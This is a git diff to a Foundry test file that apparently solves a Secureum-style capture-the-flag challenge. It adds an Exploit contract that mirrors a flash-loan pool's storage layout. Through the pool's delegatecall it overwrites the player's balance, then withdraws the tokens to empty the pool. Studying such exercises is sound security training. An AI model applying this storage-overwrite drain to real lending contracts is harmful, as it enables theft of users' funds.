@@ -4,6 +4,8 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "forge-std/console2.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 
 import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
 import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
@@ -33,20 +35,23 @@ contract Challenge1Test is Test {
         //////////////////////////////*/
 
         //=== this is a sample of flash loan usage
-        FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();
+        Exploit _exploit = new Exploit();
 
-        target.flashLoan(
-          address(_flashLoanReceiver),
-          abi.encodeWithSignature(
-            "receiveFlashLoan(address)", player
-          )
-        );
-        //===
+         target.flashLoan(
+           address(_exploit),
+           abi.encodeWithSignature(
+             "exploit(address)", player
+           )
+         );
+
+        target.withdraw(10 ether);
 
         //============================//
 
         vm.stopPrank();
 
+        // This passes (exploit is empty)
+        //assertEq(token.balanceOf(address(_exploit)), 0, "exploit must be empty");
         assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
     }
 }
@@ -74,6 +79,26 @@ contract FlashLoandReceiverSample {
     }
 }
 
-// @dev this is the solution
 contract Exploit {
+    // Copy the layout of the vulnerable contract
+    using Address for address;
+    using SafeERC20 for IERC20;
+
+    /// @dev Token contract address to be used for lending.
+    //IERC20 immutable public token;
+    IERC20 public token;
+    /// @dev Internal balances of the pool for each user.
+    mapping(address => uint) public balances;
+
+    // flag to notice contract is on a flashloan
+    bool private _flashLoan = false;
+    InSecureumLenderPool pool;
+
+    function exploit(address player) external {
+        // Delegatecall allows us to execute functions using the calling contract's storage.
+        // Here we can change the contract's internal balance to give us a token balance
+        // just updating the entry for the player address in the contact's balance mapping.
+        balances[player] = 10 ether;
+    }
 }
+
